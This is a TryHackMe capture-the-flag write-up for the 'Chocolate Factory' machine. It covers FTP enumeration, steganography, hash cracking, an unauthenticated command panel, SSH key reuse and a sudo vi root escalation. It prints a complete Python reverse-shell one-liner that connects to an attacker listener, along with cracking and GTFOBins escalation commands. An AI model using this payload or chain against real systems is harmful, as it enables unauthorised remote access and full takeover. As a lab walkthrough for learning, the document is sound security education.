# Chocolate Factory - TryHackMe

Linux machine with FTP anonymous access, a steganography-hidden SHA-512 hash, a login-bypassed web panel with command execution, and a sudo `vi` misconfiguration. The chain moves through FTP enumeration, image analysis, hash cracking, content discovery, reverse shell via command panel, SSH key recovery, and GTFOBins escalation.

---

## Enumeration

### Network Scanning

```bash
nmap -sC -sV -Pn 10.63.157.212
```

Open ports:

- 21/tcp - FTP (anonymous login enabled)
- 22/tcp - SSH
- 80/tcp - HTTP (login page)
- additional ports present but not part of the attack chain

### FTP Enumeration

```bash
ftp 10.63.157.212
# username: anonymous
# password: [blank]
```

File present: `gum_room.jpg`. Downloaded:

```bash
get gum_room.jpg
bye
```

### Steganography Analysis

Standard checks (strings, exiftool, file) returned nothing useful. Running `steghide`:

```bash
steghide extract -sf gum_room.jpg
# passphrase: [blank]
```

Extracted `b64.txt`:

```bash
base64 -d b64.txt
```

Output: a SHA-512 hash associated with user `charlie`, plus a password list.

### Hash Cracking

```bash
john shadow.txt --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt
john --show shadow.txt
```

`charlie`'s password recovered.

### Web Enumeration

The site root presented a login page. Rather than brute-forcing it, directory enumeration revealed a direct path:

```bash
gobuster dir -u http://10.63.157.212/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 20
```

Result: `/home.php` - accessible without authentication and exposing a command execution panel.

---

## Initial Access

### Remote Code Execution via Web Panel

Command execution confirmed via `id` and `whoami` in the panel.

Listener on the attack box:

```bash
nc -lvnp 4444
```

Python reverse shell payload submitted through the panel:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.63.99.155",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
```

Shell obtained. Stabilized:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## Post-Exploitation

### SSH Key Recovery

Local enumeration in `/home/charlie`:

```bash
ls -la
cat teleport
```

`teleport` contained a private SSH key for `charlie`. Saved it locally:

```bash
chmod 600 id_rsa
ssh -i id_rsa charlie@10.63.157.212
cat user.txt
```

---

## Privilege Escalation

### Sudo Enumeration

```bash
sudo -l
```

Output:

```
(root) NOPASSWD: /usr/bin/vi
```

### GTFOBins - vi

```bash
sudo vi -c ':!/bin/sh'
```

Root shell obtained.

### Root Flag

In `/root`, a file `root.py` was present. It required the key previously found in `key_rev_key` to produce the root flag. Execute the script with the correct key when prompted.

---

## Flags

```
user.txt  -> /home/charlie/user.txt
root.txt  -> obtained by running /root/root.py with key from key_rev_key
```

---

## Key Takeaways

- When a login page blocks progress, run directory enumeration in parallel. `/home.php` bypassed authentication entirely - no credentials needed.
- `steghide` at blank passphrase is a mandatory check when a suspicious image appears. `strings` and `exiftool` are not substitutes for actual steganography extraction.
- A file named `teleport` in a home directory is an SSH key. Read unexpected files - their names are often descriptive in CTF machines.
- The web-based reverse shell provides the initial foothold; the SSH key found post-foothold provides a stable shell. Both serve different purposes in the chain.
- `sudo vi` is a trivially abused GTFOBins entry. Check `sudo -l` after every privilege change, not just at initial access.

---

## Disclaimer

This lab was completed in a controlled environment provided by TryHackMe. All actions were performed strictly for educational purposes.
